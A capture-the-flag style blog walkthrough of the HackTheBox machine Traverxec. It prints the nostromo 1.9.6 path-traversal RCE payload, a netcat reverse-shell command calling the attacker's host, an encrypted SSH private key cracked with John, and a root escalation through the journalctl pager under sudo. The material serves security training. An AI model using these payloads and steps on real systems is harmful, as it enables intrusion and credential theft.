---
title: "Traverxec - HackTheBox"
date: "2020-04-11"
tags: [path traversal, rce]
---

![](https://res.cloudinary.com/dytfhf4l8/image/upload/blog/hackthebox/traverxec/traverxec.png)
Traverxec is an easy Linux machine on HackTheBox involving a path traversal bug
that allows RCE, cracking an SSH key and exploiting the pager functionality of
journalctl to get a root shell.

## Information gathering
Let's start with a port scan:
```
$ nmap -A -T4 10.10.10.165
Starting Nmap 7.80 ( https://nmap.org ) at 2019-11-21 15:11 PST
Nmap scan report for 10.10.10.165
Host is up (0.051s latency).
Not shown: 998 filtered ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u1 (protocol 2.0)
| ssh-hostkey:
|   2048 aa:99:a8:16:68:cd:41:cc:f9:6c:84:01:c7:59:09:5c (RSA)
|   256 93:dd:1a:23:ee:d7:1f:08:6b:58:47:09:73:a3:88:cc (ECDSA)
|_  256 9d:d6:62:1e:7a:fb:8f:56:92:e6:37:f1:10:db:9b:ce (ED25519)
80/tcp open  http    nostromo 1.9.6
|_http-server-header: nostromo 1.9.6
|_http-title: TRAVERXEC
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

The web server hosts a simple presentation page:
![](https://res.cloudinary.com/dytfhf4l8/image/upload/blog/hackthebox/traverxec/web.png)

## Exploiting nostromo
As I've never heard about nostromo, the first thing I did is to search for
exploits:
```
$ searchsploit nostromo
-------------------------------------------------------------------------------- ----------------------------------------
 Exploit Title                                                                  |  Path
                                                                                | (/usr/share/exploitdb/)
-------------------------------------------------------------------------------- ----------------------------------------
Nostromo - Directory Traversal Remote Command Execution (Metasploit)            | exploits/multiple/remote/47573.rb
nostromo 1.9.6 - Remote Code Execution                                          | exploits/multiple/remote/47837.py
nostromo nhttpd 1.9.3 - Directory Traversal Remote Command Execution            | exploits/linux/remote/35466.sh
-------------------------------------------------------------------------------- ----------------------------------------
Shellcodes: No Result
```

`47837.py` looks like our guy! Let's download it with `searchsploit -m 47837.py`
and try it:

```
$ ./47837.py 10.10.10.165 80 whoami


                                        _____-2019-16278
        _____  _______    ______   _____\    \
   _____\    \_\      |  |      | /    / |    |
  /     /|     ||     /  /     /|/    /  /___/|
 /     / /____/||\    \  \    |/|    |__ |___|/
|     | |____|/ \ \    \ |    | |       \
|     |  _____   \|     \|    | |     __/ __
|\     \|\    \   |\         /| |\    \  /  \
| \_____\|    |   | \_______/ | | \____\/    |
| |     /____/|    \ |     | /  | |    |____/|
 \|_____|    ||     \|_____|/    \|____|   | |
        |____|/                        |___|/




HTTP/1.1 200 OK
Date: Thu, 09 Apr 2020 21:08:11 GMT
Server: nostromo 1.9.6
Connection: close


www-data
```

And it works! This is the important part of the code:

```python
def cve(target, port, cmd):
    soc = socket.socket()
    soc.connect((target, int(port)))
    payload = 'POST /.%0d./.%0d./.%0d./.%0d./bin/sh HTTP/1.0\r\nContent-Length: 1\r\n\r\necho\necho\n{} 2>&1'.format(cmd)
    soc.send(payload)
    receive = connect(soc)
    print(receive)
```

It is basically a RCE by path traversal, it runs `/bin/sh` and pass to it our
argument.

## Getting a shell
Let's start a netcat listener with `rlwrap nc -lnvp 1337` and get a
reverse shell with `./47837.py 10.10.10.165 80 'nc 10.10.14.81 1337 -c
/bin/bash'`. `rlwrap` allows us to use up and down arrows, and let's get a
prompt also:
```
python -c 'import pty; pty.spawn("bash")'
www-data@traverxec:/usr/bin$
```

Looks like we have a user called `david`, and no access to it's home directory:
```
www-data@traverxec:/usr/bin$ ls -l /home
ls -l /home
total 4
drwx--x--x 5 david david 4096 Oct 25 17:02 david
```

While exploring the file system, we can see there's an some interesing files in
the web server configuration directory:
```
www-data@traverxec:/var/nostromo/conf$ ls -la
ls -la
total 20
drwxr-xr-x 2 root daemon 4096 Oct 27 16:12 .
drwxr-xr-x 6 root root   4096 Oct 25 14:43 ..
-rw-r--r-- 1 root bin      41 Oct 25 15:20 .htpasswd
-rw-r--r-- 1 root bin    2928 Oct 25 14:26 mimes
-rw-r--r-- 1 root bin     498 Oct 25 15:20 nhttpd.conf
```

Here's the configuration file:
```
www-data@traverxec:/var/nostromo/conf$ cat nhttpd.conf
cat nhttpd.conf
# MAIN [MANDATORY]

servername              traverxec.htb
serverlisten            *
serveradmin             david@traverxec.htb
serverroot              /var/nostromo
servermimes             conf/mimes
docroot                 /var/nostromo/htdocs
docindex                index.html

# LOGS [OPTIONAL]

logpid                  logs/nhttpd.pid

# SETUID [RECOMMENDED]

user                    www-data

# BASIC AUTHENTICATION [OPTIONAL]

htaccess                .htaccess
htpasswd                /var/nostromo/conf/.htpasswd

# ALIASES [OPTIONAL]

/icons                  /var/nostromo/icons

# HOMEDIRS [OPTIONAL]

homedirs                /home
homedirs_public         public_www
```

Basically, after reading the
[documentation](http://www.nazgul.ch/dev/nostromo_man.html), what I've
understood is that nostromo creates a path on the web server named as every
folder in `/home` and prepending a `~` to it, and it's root will be a folder
called `public_www` in the respective user home. In this case, for example, we
have `http://10.10.10.165/~david/` point to `/home/david/public_www`:
![](https://res.cloudinary.com/dytfhf4l8/image/upload/blog/hackthebox/traverxec/david.png)

We can list all the files in `~david` then:
```
www-data@traverxec:/var/nostromo/conf$ ls /home/david/public_www
index.html  protected-file-area
```

Let's see what's in there:
```
www-data@traverxec:/var/nostromo/conf$ ls /home/david/public_www/protected-file-area
backup-ssh-identity-files.tgz
```

Let's move to `/tmp` and extract it:
```
www-data@traverxec:/tmp$ tar zvxf /home/david/public_www/protected-file-area/backup-ssh-identity-files.tgz
home/david/.ssh/
home/david/.ssh/authorized_keys
home/david/.ssh/id_rsa
home/david/.ssh/id_rsa.pub
```

Looks like we have an encrypted ssh key:
```
www-data@traverxec:/tmp/home/david/.ssh$ cat id_rsa
cat id_rsa
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,477EEFFBA56F9D283D349033D5D08C4F

seyeH/feG19TlUaMdvHZK/2qfy8pwwdr9sg75x4hPpJJ8YauhWorCN4LPJV+wfCG
tuiBPfZy+ZPklLkOneIggoruLkVGW4k4651pwekZnjsT8IMM3jndLNSRkjxCTX3W
KzW9VFPujSQZnHM9Jho6J8O8LTzl+s6GjPpFxjo2Ar2nPwjofdQejPBeO7kXwDFU
RJUpcsAtpHAbXaJI9LFyX8IhQ8frTOOLuBMmuSEwhz9KVjw2kiLBLyKS+sUT9/V7
HHVHW47Y/EVFgrEXKu0OP8rFtYULQ+7k7nfb7fHIgKJ/6QYZe69r0AXEOtv44zIc
Y1OMGryQp5CVztcCHLyS/9GsRB0d0TtlqY2LXk+1nuYPyyZJhyngE7bP9jsp+hec
dTRqVqTnP7zI8GyKTV+KNgA0m7UWQNS+JgqvSQ9YDjZIwFlA8jxJP9HsuWWXT0ZN
6pmYZc/rNkCEl2l/oJbaJB3jP/1GWzo/q5JXA6jjyrd9xZDN5bX2E2gzdcCPd5qO
xwzna6js2kMdCxIRNVErnvSGBIBS0s/OnXpHnJTjMrkqgrPWCeLAf0xEPTgktqi1
Q2IMJqhW9LkUs48s+z72eAhl8naEfgn+fbQm5MMZ/x6BCuxSNWAFqnuj4RALjdn6
i27gesRkxxnSMZ5DmQXMrrIBuuLJ6gHgjruaCpdh5HuEHEfUFqnbJobJA3Nev54T
fzeAtR8rVJHlCuo5jmu6hitqGsjyHFJ/hSFYtbO5CmZR0hMWl1zVQ3CbNhjeIwFA
bzgSzzJdKYbGD9tyfK3z3RckVhgVDgEMFRB5HqC+yHDyRb+U5ka3LclgT1rO+2so
uDi6fXyvABX+e4E4lwJZoBtHk/NqMvDTeb9tdNOkVbTdFc2kWtz98VF9yoN82u8I
Ak/KOnp7lzHnR07dvdD61RzHkm37rvTYrUexaHJ458dHT36rfUxafe81v6l6RM8s
9CBrEp+LKAA2JrK5P20BrqFuPfWXvFtROLYepG9eHNFeN4uMsuT/55lbfn5S41/U
rGw0txYInVmeLR0RJO37b3/haSIrycak8LZzFSPUNuwqFcbxR8QJFqqLxhaMztua
4mOqrAeGFPP8DSgY3TCloRM0Hi/MzHPUIctxHV2RbYO/6TDHfz+Z26ntXPzuAgRU
/8Gzgw56EyHDaTgNtqYadXruYJ1iNDyArEAu+KvVZhYlYjhSLFfo2yRdOuGBm9AX
JPNeaxw0DX8UwGbAQyU0k49ePBFeEgQh9NEcYegCoHluaqpafxYx2c5MpY1nRg8+
XBzbLF9pcMxZiAWrs4bWUqAodXfEU6FZv7dsatTa9lwH04aj/5qxEbJuwuAuW5Lh
hORAZvbHuIxCzneqqRjS4tNRm0kF9uI5WkfK1eLMO3gXtVffO6vDD3mcTNL1pQuf
SP0GqvQ1diBixPMx+YkiimRggUwcGnd3lRBBQ2MNwWt59Rri3Z4Ai0pfb1K7TvOM
j1aQ4bQmVX8uBoqbPvW0/oQjkbCvfR4Xv6Q+cba/FnGNZxhHR8jcH80VaNS469tt
VeYniFU/TGnRKDYLQH2x0ni1tBf0wKOLERY0CbGDcquzRoWjAmTN/PV2VbEKKD/w
-----END RSA PRIVATE KEY-----
```

Let's copy it on our machine and try to crack it with John:
```
$ ssh2john.py id_rsa > id_rsa.hash
$ john --wordlist=lists/rockyou.txt id_rsa.hash                                                                                                      
Using default input encoding: UTF-8
Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 8 OpenMP threads
Note: This format may emit false positives, so it will keep trying even after
finding a possible candidate.
Press 'q' or Ctrl-C to abort, almost any other key for status
hunter           (id_rsa)
Warning: Only 1 candidate left, minimum 8 needed for performance.
1g 0:00:00:02 DONE (2019-11-21 18:03) 0.4329g/s 6208Kp/s 6208Kc/s 6208KC/s *7¡Vamos!
Session completed
```

## Escalation to user
Let's try to use it to get a shell as `david`:
```
$ ssh david@10.10.10.165 -i id_rsa
The authenticity of host '10.10.10.165 (10.10.10.165)' can't be established.
ECDSA key fingerprint is SHA256:CiO/pUMzd+6bHnEhA2rAU30QQiNdWOtkEPtJoXnWzVo.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.10.165' (ECDSA) to the list of known hosts.
Enter passphrase for key 'id_rsa':
Linux traverxec 4.19.0-6-amd64 #1 SMP Debian 4.19.67-2+deb10u1 (2019-09-20) x86_64
david@traverxec:~$
```

And we got user!

## Root escalation
As we login, we can see a folder named `bin` that contains a script called
`server-stats.sh`
```bash
#!/bin/bash

cat /home/david/bin/server-stats.head
echo "Load: `/usr/bin/uptime`"
echo " "
echo "Open nhttpd sockets: `/usr/bin/ss -H sport = 80 | /usr/bin/wc -l`"
echo "Files in the docroot: `/usr/bin/find /var/nostromo/htdocs/ | /usr/bin/wc -l`"
echo " "
echo "Last 5 journal log lines:"
/usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service | /usr/bin/cat
```

It is basically a script that shows some informations about the server:
```
david@traverxec:~/bin$ ./server-stats.sh
                                                                          .----.
                                                              .---------. | == |
   Webserver Statistics and Data                              |.-"""""-.| |----|
         Collection Script                                    ||       || | == |
          (c) David, 2019                                     ||       || |----|
                                                              |'-.....-'| |::::|
                                                              '"")---(""' |___.|
                                                             /:::::::::::\"    "
                                                            /:::=======:::\
                                                        jgs '"""""""""""""'

Load:  18:46:50 up  4:59,  1 user,  load average: 0.00, 0.00, 0.00

Open nhttpd sockets: 1
Files in the docroot: 117

Last 5 journal log lines:
-- Logs begin at Sun 2020-04-12 13:47:08 EDT, end at Sun 2020-04-12 18:46:50 EDT. --
Apr 12 13:47:12 traverxec systemd[1]: Started nostromo nhttpd server.
Apr 12 14:23:33 traverxec sudo[764]: pam_unix(sudo:auth): conversation failed
Apr 12 14:23:33 traverxec sudo[764]: pam_unix(sudo:auth): auth could not identify password for [www-data]
Apr 12 14:23:33 traverxec sudo[764]: www-data : command not allowed ; TTY=unknown ; PWD=/usr/bin ; USER=root ; COMMAND=list
Apr 12 14:43:23 traverxec sudo[835]: pam_unix(sudo:auth): authentication failure; logname= uid=33 euid=0 tty=/dev/pts/0 ruser=www-data rhost=  user=www-data
```

Notice that when you run it it does not ask for the user's password, despite
using sudo on the last line? We can exploit this because `journalctl` uses
`less` to stop output from scrolling too much:
![](https://res.cloudinary.com/dytfhf4l8/image/upload/blog/hackthebox/traverxec/journalctl.png)

And we can use `less` to get a shell as root, because `journalctl` was launched
with `sudo`:
![](https://res.cloudinary.com/dytfhf4l8/image/upload/blog/hackthebox/traverxec/root-shell.png)

Cool little trick, right? Who would think to something about that!
Let's check the root flag:
```
# wc -c /root/root.txt
33 /root/root.txt
```

And this was it, thanks for reading!
